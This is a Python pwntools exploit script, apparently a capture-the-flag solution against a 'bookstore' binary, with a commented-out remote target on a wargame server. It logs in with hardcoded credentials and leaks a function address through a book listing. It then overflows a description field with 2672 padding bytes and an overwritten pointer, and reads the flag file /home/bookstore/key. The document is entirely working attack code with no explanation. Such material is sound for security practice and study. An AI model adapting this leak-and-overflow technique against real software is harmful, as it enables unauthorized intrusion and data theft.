from pwn import *

s = process('./bookstore')
#s=remote('war.sejongssg.kr' ,40205)
s.recvuntil(' : ')
s.send('helloadmin')
s.recvuntil(' : ')
s.send('iulover!@#$')

log.info('Login success')

s.recvuntil('> ')
s.sendline('1')
s.recvuntil(':')
s.send('a')
s.recvuntil(':')
s.send('a')
s.recvuntil(')')
s.sendline('0')

s.recvuntil('> ')
s.sendline('2')
s.recvuntil(' : ')
s.sendline('0')
s.recvuntil('menu!\n')
s.sendline('3')

s.recvuntil(':')
s.sendline('1633771873')
s.recvuntil(':')
s.sendline('1633771873')
s.recvuntil(')')
s.sendline('0')
s.recvuntil(':')
s.sendline('1')
s.recvuntil('name')
s.send('b'*20)
s.recvuntil('tion')
s.send('a')

s.recvuntil('menu!')
s.sendline('0')

s.recvuntil('> ')
s.sendline('4')
s.recvuntil('a'*8)
leak = u32(s.recv(4))
read_func = leak - 210

s.recvuntil('> ')
s.sendline('2')
s.recvuntil(' : ')
s.sendline('0')
s.recvuntil('menu!')
s.sendline('2')
s.recvuntil('Input new description')
#s.interactive()
s.sendline('a'*2672+p32(read_func))
#s.interactive()
s.recvuntil('menu!')
s.sendline('3')
s.recvuntil('Input Stock :')
s.sendline('1234')
s.recvuntil('Input Price :')
s.sendline('1234')
s.recvuntil('Set Free Shipping? (1 : free shipping | 0 : not)')
s.sendline('0')
s.recvuntil('Set Avaliable :')
s.sendline('1')
s.recvuntil('Input new bookname')
s.send('/home/bookstore/key')
s.recvuntil('Input new description')
s.send('asdf')
s.recvuntil('menu!')
s.sendline('4')
s.recvuntil('\n')
s.sendline('1')
#s.interactive()
print s.recvuntil('menu!')
s.sendline('0')
print s.recv(2048)
s.sendline('3')
#s.recvuntil('')
s.sendline('0')
print s.recv()